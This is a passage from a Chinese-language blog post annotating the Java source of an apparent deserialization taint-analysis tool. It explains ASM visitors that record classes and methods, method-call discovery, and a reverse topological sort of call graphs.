class="line">        <span class="comment">// 记录字段信息，保存到 members</span></span><br><span class="line">        members.add(<span class="keyword">new</span> ClassReference.Member(name, access, <span class="keyword">new</span> ClassReference.Handle(typeName)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> 方法用于记录方法信息，包括所属类名、方法名、描述符、是否为静态方法，同样根据访问标志判断是否为静态方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123; <span class="comment">// 访问方法</span></span><br><span class="line">    <span class="keyword">boolean</span> isStatic = (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;  <span class="comment">// 是否为静态方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录方法信息，保存到 discoveredMethods</span></span><br><span class="line">    discoveredMethods.add(<span class="keyword">new</span> MethodReference(</span><br><span class="line">            classHandle,    <span class="comment">// 所属类</span></span><br><span class="line">            name,</span><br><span class="line">            desc,</span><br><span class="line">            isStatic));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> 方法在类访问结束时调用，（即 <code>ClassReader.accept</code> 调用的最后一个访问者方法），此时类的字段信息已经记录完毕，可以记录下完整的类信息，包括类名、父类名、接口名、是否为接口、字段信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;    <span class="comment">// 类访问结束（调用的最后一个方法）</span></span><br><span class="line">    ClassReference classReference = <span class="keyword">new</span> ClassReference(</span><br><span class="line">            name,</span><br><span class="line">            superName,</span><br><span class="line">            interfaces,</span><br><span class="line">            isInterface,</span><br><span class="line">            members.toArray(<span class="keyword">new</span> ClassReference.Member[members.size()])); <span class="comment">// 把所有找到的字段封装</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录类信息，保存到 discoveredClasses</span></span><br><span class="line">    discoveredClasses.add(classReference);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法存储收集到的类信息和方法信息，同时调用 <code>InheritanceDeriver.derive</code> 获取继承信息并保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// classes.dat 数据格式：</span></span><br><span class="line">    <span class="comment">// 类名 父类名 接口A,接口B,接口C 是否为接口 字段1!字段1描述符!字段1类型!字段2!字段2描述符!字段2类型</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> ClassReference.Factory(), discoveredClasses);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// methods.dat 数据格式：</span></span><br><span class="line">    <span class="comment">// 类名 方法名 方法描述符 是否为静态方法</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> MethodReference.Factory(), discoveredMethods);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 形成 类名(ClassReference.Handle)-&gt;类(ClassReference) 的映射关系</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">        classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对上面的类信息进行递归整合，得到 `子类-&gt;父类集合` 的继承信息，保存到 inheritanceMap.dat</span></span><br><span class="line">    InheritanceDeriver.derive(classMap).save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-PassthroughDiscovery"><a href="#5-PassthroughDiscovery" class="headerlink" title="5. PassthroughDiscovery"></a>5. PassthroughDiscovery</h2><p><code>discover</code> 方法主要执行了三个步骤：① 搜索方法调用信息，即每个方法都调用了哪些方法；② 将调用信息进行逆拓扑排序，为了便于后续分析；③ 分析每个方法的参数，判断是否能够传递污染，即方法的返回结果是否可以被其参数影响。</p><p>例如以下两个方法中，foo 方法的返回结果可以被参数控制，而 bar 方法的返回结果无法被控制。因此如果污点（攻击者的输入数据）走到 bar 方法就不能再继续下去了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">foo</span><span class="params">(String v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">bar</span><span class="params">(String v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法的具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法调用信息：方法-&gt;调用的方法集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">// 数据流信息：方法-&gt;传递污染的参数索引</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 得到每个方法能够传递污染的参数（索引）集合</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载类信息</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 搜索方法的调用关系（methodCalls）并得到 `类名-&gt;类资源` 映射集合</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对方法的调用关系进行逆拓扑排序</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分析每个方法能够传递污染的参数</span></span><br><span class="line">    <span class="comment">// classResourceByName  类资源集合</span></span><br><span class="line">    <span class="comment">// classMap             类信息</span></span><br><span class="line">    <span class="comment">// inheritanceMap       继承信息</span></span><br><span class="line">    <span class="comment">// sortedMethods        方法集合（经逆拓扑排序）</span></span><br><span class="line">    <span class="comment">// SerializableDecider  序列化决策者</span></span><br><span class="line">    passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">            config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discoverMethodCalls</code> 方法利用 asm 的访问者记录方法调用的方法集合信息，同时存储类名和类资源的映射关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 搜索方法调用信息：方法-&gt;被调用方法集合</span></span><br><span class="line"><span class="comment"> * 存储类资源映射信息：类名-&gt;类资源</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 类名-&gt;类资源</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察</span></span><br><span class="line">                MethodCallDiscoveryClassVisitor visitor = <span class="keyword">new</span> MethodCallDiscoveryClassVisitor(Opcodes.ASM6);</span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                <span class="comment">// 存储 `类名(String)-&gt;类资源(ClassResource)` 的映射关系</span></span><br><span class="line">                classResourcesByName.put(visitor.getName(), classResource);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classResourcesByName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了三个访问者方法，并实现了一个返回类名的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCallDiscoveryClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodCallDiscoveryClassVisitor</span><span class="params">(<span class="keyword">int</span> api)</span> </span>&#123;   <span class="comment">// 访问者实现的 ASM API 版本，必须是 Opcodes.</span></span><br><span class="line">        <span class="keyword">super</span>(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name = <span class="keyword">null</span>; <span class="comment">// 类名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回类名</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> 方法只记录了当前访问的类的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                  String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.name != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;ClassVisitor already visited a class!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录类名</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> 方法使用 <code>MethodCallDiscoveryMethodVisitor</code> 类（继承了 asm 中的 MethodVisitor）观察方法，并调用 <code>JSRInlinerAdapter</code> 简化代码分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">    MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    <span class="comment">// 创建 MethodCallDiscoveryMethodVisitor 观察方法</span></span><br><span class="line">    MethodCallDiscoveryMethodVisitor modelGeneratorMethodVisitor = <span class="keyword">new</span> MethodCallDiscoveryMethodVisitor(</span><br><span class="line">            api, mv, <span class="keyword">this</span>.name, name, desc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 简化代码分析，删除 JSR 指令并内联引用的子例程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> 方法直接调用的父类方法，在这里不重写应该可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryMethodVisitor</code> 类继承了 asm 中的 MethodVisitor，只重写了 <code>visitMethodInsn</code> 方法，用于访问调用方法的指令；利用 <code>calledMethods</code> 记录当前访问的方法调用的所有方法，然后记录到 <code>methodCalls</code> 变量中，这里不注意点就看混了😵。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCallDiscoveryMethodVisitor</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 方法调用的方法集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;MethodReference.Handle&gt; calledMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法访问者构造函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> api   ASM API 版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mv    MethodVisitor 实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner 方法所属类的类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name  方法的名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc  方法的描述符</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            <span class="keyword">final</span> String owner, String name, String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api, mv);</span><br><span class="line">        <span class="comment">// 调用的方法集合，初始化</span></span><br><span class="line">        <span class="keyword">this</span>.calledMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">// 存储到 PassthroughDiscovery 的 methodCalls 中</span></span><br><span class="line">        methodCalls.put(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc), calledMethods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 访问方法指令</span></span><br><span class="line"><span class="comment">     * 方法指令是调用方法的指令</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> opcode 调用操作码：INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner  被调用的方法所属类的类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   被调用的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc   被调用方法的描述符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> itf    被调用的类是否为接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 记录调用的方法，存储到 MethodCallDiscoveryMethodVisitor 的 calledMethods 中</span></span><br><span class="line">        calledMethods.add(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc));</span><br><span class="line">        <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>topologicallySortMethodCalls</code> 方法对方法调用的方法集合进行逆拓扑排序，用于后续判断方法参数与返回值的关系，举个例子：</p><p>方法 parentMethod 在返回前调用了 Obj.childMethod，因为 Obj.childMethod 的参数 carg 与返回值有关，同时 parentMethod 将其返回值作为自己的返回结果，所以最后可以判定 parentMethod 的参数 arg 和返回值有关。</p><p>因此要先判断子方法返回值与子方法参数的关系，再判断父方法返回值与参数的关系，这样才能判断方法参数与返回值的关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">parentMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">    String vul = Obj.childMethod(arg);</span><br><span class="line">    <span class="keyword">return</span> vul;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">childMethod</span><span class="params">(String carg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> carg.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了实现先判断子方法后判断父方法，这里就需要进行逆拓扑排序，逆拓扑排序使用栈实现，变量 <code>dfsStack</code> 和 <code>visitedNodes</code> 用于避免形成环，同时 <code>visitedNodes</code> 还可以避免重复排序，具体的排序操作由 <code>dfsTsort</code> 实现，所有方法调用整合为一个集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对方法的调用关系进行逆拓扑排序（按名称逆序）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">    <span class="comment">// 拷贝方法调用的方法集合</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">        MethodReference.Handle method = entry.getKey(); <span class="comment">// 方法</span></span><br><span class="line">        outgoingReferences.put(method, <span class="keyword">new</span> HashSet&lt;&gt;(entry.getValue()));    <span class="comment">// 调用的方法集合</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Topological sort methods</span></span><br><span class="line">    LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> HashSet&lt;&gt;();     <span class="comment">// 避免形成环</span></span><br><span class="line">    Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> HashSet&lt;&gt;(); <span class="comment">// 在调用链出现重合时，避免重复排序</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> ArrayList&lt;&gt;(outgoingReferences.size());    <span class="comment">// 方法调用集合</span></span><br><span class="line">    <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">        <span class="comment">// 遍历集合中的起始方法，进行递归搜索（DFS），经过逆拓扑排序，调用链的最末端排在最前面，</span></span><br><span class="line">        <span class="comment">// 后续进行参数、返回值、调用链之间的污点传递分析</span></span><br><span class="line">        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 逆拓扑排序后的方法调用集合</span></span><br><span class="line">    <span class="keyword">return</span> sortedMethods;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 